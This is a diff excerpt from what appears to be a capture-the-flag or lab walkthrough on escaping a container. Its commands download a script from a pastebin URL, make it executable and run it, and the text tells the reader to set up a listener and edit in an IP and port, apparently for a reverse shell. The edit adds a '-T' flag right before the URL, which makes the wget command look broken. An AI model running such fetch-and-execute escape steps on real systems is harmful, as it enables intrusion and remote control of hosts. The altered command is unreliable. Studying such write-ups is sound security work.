@@ -153,7 +153,7 @@ If we see certain privilege bits set, it's time to break free! 🔓
 Let's grab and execute the escape script, make sure to create new listener and change the IP and port number that within the script:
 ```bash
 cd /tmp
-wget -O escape.sh https://pastebin.com/raw/YSbnzY2r
+wget -O escape.sh -T https://pastebin.com/raw/YSbnzY2r
 sed -i 's/\r$//' escape.sh
 chmod +x escape.sh
 ./escape.sh
